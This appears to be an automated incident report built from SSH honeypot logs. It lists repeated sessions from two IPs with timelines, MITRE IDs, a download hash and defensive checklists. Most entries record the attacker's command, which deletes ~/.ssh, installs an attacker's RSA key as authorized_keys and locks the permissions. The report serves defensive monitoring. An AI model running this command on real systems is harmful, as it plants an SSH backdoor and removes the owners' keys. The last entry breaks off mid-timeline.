| Field | Detail |
|---|---|
| **Source IP** | `120.203.25[.]201` |
| **First Seen** | 2026-04-24 22:13 |
| **Last Seen** | 2026-04-24 22:13 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:13:08` | `cowrie.session.connect` |
| `2026-04-24 22:13:08` | `cowrie.client.version` |
| `2026-04-24 22:13:08` | `cowrie.client.kex` |
| `2026-04-24 22:13:08` | `cowrie.login.success` |
| `2026-04-24 22:13:09` | `cowrie.session.params` |
| `2026-04-24 22:13:09` | `cowrie.command.input` |
| `2026-04-24 22:13:09` | `cowrie.command.failed` |
| `2026-04-24 22:13:09` | `cowrie.log.closed` |
| `2026-04-24 22:13:09` | `cowrie.session.params` |
| `2026-04-24 22:13:09` | `cowrie.command.input` |
| `2026-04-24 22:13:09` | `cowrie.session.file_download` |
| `2026-04-24 22:13:09` | `cowrie.log.closed` |
| `2026-04-24 22:13:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.203.25[.]201` to AbuseIPDB if not already reported
- [ ] Block `120.203.25[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cb718279415

| Field | Detail |
|---|---|
| **Source IP** | `120.203.25[.]201` |
| **First Seen** | 2026-04-24 22:13 |
| **Last Seen** | 2026-04-24 22:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:13:12` | `cowrie.session.connect` |
| `2026-04-24 22:13:12` | `cowrie.client.version` |
| `2026-04-24 22:13:12` | `cowrie.client.kex` |
| `2026-04-24 22:13:12` | `cowrie.login.success` |
| `2026-04-24 22:13:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.203.25[.]201` to AbuseIPDB if not already reported
- [ ] Block `120.203.25[.]201` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a9228c41445

| Field | Detail |
|---|---|
| **Source IP** | `120.203.25[.]201` |
| **First Seen** | 2026-04-24 22:13 |
| **Last Seen** | 2026-04-24 22:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:13:38` | `cowrie.session.connect` |
| `2026-04-24 22:13:38` | `cowrie.client.version` |
| `2026-04-24 22:13:38` | `cowrie.client.kex` |
| `2026-04-24 22:13:39` | `cowrie.login.success` |
| `2026-04-24 22:13:39` | `cowrie.session.params` |
| `2026-04-24 22:13:39` | `cowrie.command.input` |
| `2026-04-24 22:13:39` | `cowrie.command.failed` |
| `2026-04-24 22:13:39` | `cowrie.log.closed` |
| `2026-04-24 22:13:40` | `cowrie.session.params` |
| `2026-04-24 22:13:40` | `cowrie.command.input` |
| `2026-04-24 22:13:40` | `cowrie.session.file_download` |
| `2026-04-24 22:13:40` | `cowrie.log.closed` |
| `2026-04-24 22:13:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.203.25[.]201` to AbuseIPDB if not already reported
- [ ] Block `120.203.25[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46f44b3676ac

| Field | Detail |
|---|---|
| **Source IP** | `120.203.25[.]201` |
| **First Seen** | 2026-04-24 22:13 |
| **Last Seen** | 2026-04-24 22:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:13:42` | `cowrie.session.connect` |
| `2026-04-24 22:13:42` | `cowrie.client.version` |
| `2026-04-24 22:13:42` | `cowrie.client.kex` |
| `2026-04-24 22:13:43` | `cowrie.login.success` |
| `2026-04-24 22:13:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.203.25[.]201` to AbuseIPDB if not already reported
- [ ] Block `120.203.25[.]201` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6f3fa75b25c

| Field | Detail |
|---|---|
| **Source IP** | `120.203.25[.]201` |
| **First Seen** | 2026-04-24 22:13 |
| **Last Seen** | 2026-04-24 22:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:13:58` | `cowrie.session.connect` |
| `2026-04-24 22:13:58` | `cowrie.client.version` |
| `2026-04-24 22:13:58` | `cowrie.client.kex` |
| `2026-04-24 22:13:59` | `cowrie.login.success` |
| `2026-04-24 22:13:59` | `cowrie.session.params` |
| `2026-04-24 22:13:59` | `cowrie.command.input` |
| `2026-04-24 22:13:59` | `cowrie.command.failed` |
| `2026-04-24 22:13:59` | `cowrie.log.closed` |
| `2026-04-24 22:14:00` | `cowrie.session.params` |
| `2026-04-24 22:14:00` | `cowrie.command.input` |
| `2026-04-24 22:14:00` | `cowrie.session.file_download` |
| `2026-04-24 22:14:00` | `cowrie.log.closed` |
| `2026-04-24 22:14:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.203.25[.]201` to AbuseIPDB if not already reported
- [ ] Block `120.203.25[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b68e999dee3e

| Field | Detail |
|---|---|
| **Source IP** | `120.203.25[.]201` |
| **First Seen** | 2026-04-24 22:14 |
| **Last Seen** | 2026-04-24 22:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:14:02` | `cowrie.session.connect` |
| `2026-04-24 22:14:02` | `cowrie.client.version` |
| `2026-04-24 22:14:02` | `cowrie.client.kex` |
| `2026-04-24 22:14:03` | `cowrie.login.success` |
| `2026-04-24 22:14:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.203.25[.]201` to AbuseIPDB if not already reported
- [ ] Block `120.203.25[.]201` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f69ae10117b0

| Field | Detail |
|---|---|
| **Source IP** | `120.203.25[.]201` |
| **First Seen** | 2026-04-24 22:14 |
| **Last Seen** | 2026-04-24 22:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:14:23` | `cowrie.session.connect` |
| `2026-04-24 22:14:23` | `cowrie.client.version` |
| `2026-04-24 22:14:23` | `cowrie.client.kex` |
| `2026-04-24 22:14:24` | `cowrie.login.success` |
| `2026-04-24 22:14:24` | `cowrie.session.params` |
| `2026-04-24 22:14:24` | `cowrie.command.input` |
| `2026-04-24 22:14:24` | `cowrie.command.failed` |
| `2026-04-24 22:14:24` | `cowrie.log.closed` |
| `2026-04-24 22:14:25` | `cowrie.session.params` |
| `2026-04-24 22:14:25` | `cowrie.command.input` |
| `2026-04-24 22:14:25` | `cowrie.session.file_download` |
| `2026-04-24 22:14:25` | `cowrie.log.closed` |
| `2026-04-24 22:14:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.203.25[.]201` to AbuseIPDB if not already reported
- [ ] Block `120.203.25[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-232631dfed6f

| Field | Detail |
|---|---|
| **Source IP** | `120.203.25[.]201` |
| **First Seen** | 2026-04-24 22:14 |
| **Last Seen** | 2026-04-24 22:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:14:27` | `cowrie.session.connect` |
| `2026-04-24 22:14:27` | `cowrie.client.version` |
| `2026-04-24 22:14:27` | `cowrie.client.kex` |
| `2026-04-24 22:14:28` | `cowrie.login.success` |
| `2026-04-24 22:14:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.203.25[.]201` to AbuseIPDB if not already reported
- [ ] Block `120.203.25[.]201` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7adf7c4699be

| Field | Detail |
|---|---|
| **Source IP** | `120.203.25[.]201` |
| **First Seen** | 2026-04-24 22:14 |
| **Last Seen** | 2026-04-24 22:14 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:14:32` | `cowrie.session.connect` |
| `2026-04-24 22:14:32` | `cowrie.client.version` |
| `2026-04-24 22:14:32` | `cowrie.client.kex` |
| `2026-04-24 22:14:33` | `cowrie.login.success` |
| `2026-04-24 22:14:33` | `cowrie.session.params` |
| `2026-04-24 22:14:33` | `cowrie.command.input` |
| `2026-04-24 22:14:33` | `cowrie.command.failed` |
| `2026-04-24 22:14:33` | `cowrie.log.closed` |
| `2026-04-24 22:14:34` | `cowrie.session.params` |
| `2026-04-24 22:14:34` | `cowrie.command.input` |
| `2026-04-24 22:14:34` | `cowrie.session.file_download` |
| `2026-04-24 22:14:34` | `cowrie.log.closed` |
| `2026-04-24 22:14:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.203.25[.]201` to AbuseIPDB if not already reported
- [ ] Block `120.203.25[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce9306fd492b

| Field | Detail |
|---|---|
| **Source IP** | `120.203.25[.]201` |
| **First Seen** | 2026-04-24 22:14 |
| **Last Seen** | 2026-04-24 22:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:14:36` | `cowrie.session.connect` |
| `2026-04-24 22:14:36` | `cowrie.client.version` |
| `2026-04-24 22:14:36` | `cowrie.client.kex` |
| `2026-04-24 22:14:37` | `cowrie.login.success` |
| `2026-04-24 22:14:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.203.25[.]201` to AbuseIPDB if not already reported
- [ ] Block `120.203.25[.]201` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b171a4e1204f

| Field | Detail |
|---|---|
| **Source IP** | `120.203.25[.]201` |
| **First Seen** | 2026-04-24 22:14 |
| **Last Seen** | 2026-04-24 22:14 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:14:42` | `cowrie.session.connect` |
| `2026-04-24 22:14:42` | `cowrie.client.version` |
| `2026-04-24 22:14:42` | `cowrie.client.kex` |
| `2026-04-24 22:14:42` | `cowrie.login.success` |
| `2026-04-24 22:14:43` | `cowrie.session.params` |
| `2026-04-24 22:14:43` | `cowrie.command.input` |
| `2026-04-24 22:14:43` | `cowrie.command.failed` |
| `2026-04-24 22:14:43` | `cowrie.log.closed` |
| `2026-04-24 22:14:43` | `cowrie.session.params` |
| `2026-04-24 22:14:43` | `cowrie.command.input` |
| `2026-04-24 22:14:43` | `cowrie.session.file_download` |
| `2026-04-24 22:14:43` | `cowrie.log.closed` |
| `2026-04-24 22:14:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.203.25[.]201` to AbuseIPDB if not already reported
- [ ] Block `120.203.25[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70eaadf73912

| Field | Detail |
|---|---|
| **Source IP** | `120.203.25[.]201` |
| **First Seen** | 2026-04-24 22:14 |
| **Last Seen** | 2026-04-24 22:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:14:46` | `cowrie.session.connect` |
| `2026-04-24 22:14:46` | `cowrie.client.version` |
| `2026-04-24 22:14:46` | `cowrie.client.kex` |
| `2026-04-24 22:14:46` | `cowrie.login.success` |
| `2026-04-24 22:14:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.203.25[.]201` to AbuseIPDB if not already reported
- [ ] Block `120.203.25[.]201` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e39e5a68c49

| Field | Detail |
|---|---|
| **Source IP** | `120.203.25[.]201` |
| **First Seen** | 2026-04-24 22:14 |
| **Last Seen** | 2026-04-24 22:14 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:14:50` | `cowrie.session.connect` |
| `2026-04-24 22:14:50` | `cowrie.client.version` |
| `2026-04-24 22:14:50` | `cowrie.client.kex` |
| `2026-04-24 22:14:51` | `cowrie.login.success` |
| `2026-04-24 22:14:51` | `cowrie.session.params` |
| `2026-04-24 22:14:51` | `cowrie.command.input` |
| `2026-04-24 22:14:51` | `cowrie.command.failed` |
| `2026-04-24 22:14:51` | `cowrie.log.closed` |
| `2026-04-24 22:14:52` | `cowrie.session.params` |
| `2026-04-24 22:14:52` | `cowrie.command.input` |
| `2026-04-24 22:14:52` | `cowrie.session.file_download` |
| `2026-04-24 22:14:52` | `cowrie.log.closed` |
| `2026-04-24 22:14:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.203.25[.]201` to AbuseIPDB if not already reported
- [ ] Block `120.203.25[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20523ca811af

| Field | Detail |
|---|---|
| **Source IP** | `120.203.25[.]201` |
| **First Seen** | 2026-04-24 22:14 |
| **Last Seen** | 2026-04-24 22:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:14:54` | `cowrie.session.connect` |
| `2026-04-24 22:14:54` | `cowrie.client.version` |
| `2026-04-24 22:14:54` | `cowrie.client.kex` |
| `2026-04-24 22:14:55` | `cowrie.login.success` |
| `2026-04-24 22:14:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.203.25[.]201` to AbuseIPDB if not already reported
- [ ] Block `120.203.25[.]201` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a83af31c52da

| Field | Detail |
|---|---|
| **Source IP** | `114.98.230[.]202` |
| **First Seen** | 2026-04-24 22:17 |
| **Last Seen** | 2026-04-24 22:17 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:17:17` | `cowrie.session.connect` |
| `2026-04-24 22:17:17` | `cowrie.client.version` |
| `2026-04-24 22:17:17` | `cowrie.client.kex` |
| `2026-04-24 22:17:19` | `cowrie.login.success` |
| `2026-04-24 22:17:20` | `cowrie.session.params` |
| `2026-04-24 22:17:20` | `cowrie.command.input` |
| `2026-04-24 22:17:20` | `cowrie.command.failed` |
| `2026-04-24 22:17:20` | `cowrie.log.closed` |
| `2026-04-24 22:17:20` | `cowrie.session.params` |
| `2026-04-24 22:17:20` | `cowrie.command.input` |
| `2026-04-24 22:17:21` | `cowrie.session.file_download` |
| `2026-04-24 22:17:21` | `cowrie.log.closed` |
| `2026-04-24 22:17:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.98.230[.]202` to AbuseIPDB if not already reported
- [ ] Block `114.98.230[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3a42e72159d

| Field | Detail |
|---|---|
| **Source IP** | `114.98.230[.]202` |
| **First Seen** | 2026-04-24 22:17 |
| **Last Seen** | 2026-04-24 22:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:17:25` | `cowrie.session.connect` |
| `2026-04-24 22:17:25` | `cowrie.client.version` |
| `2026-04-24 22:17:25` | `cowrie.client.kex` |
| `2026-04-24 22:17:26` | `cowrie.login.success` |
| `2026-04-24 22:17:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.98.230[.]202` to AbuseIPDB if not already reported
- [ ] Block `114.98.230[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d4bc3e5d419

| Field | Detail |
|---|---|
| **Source IP** | `114.98.230[.]202` |
| **First Seen** | 2026-04-24 22:19 |
| **Last Seen** | 2026-04-24 22:19 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:19:00` | `cowrie.session.connect` |
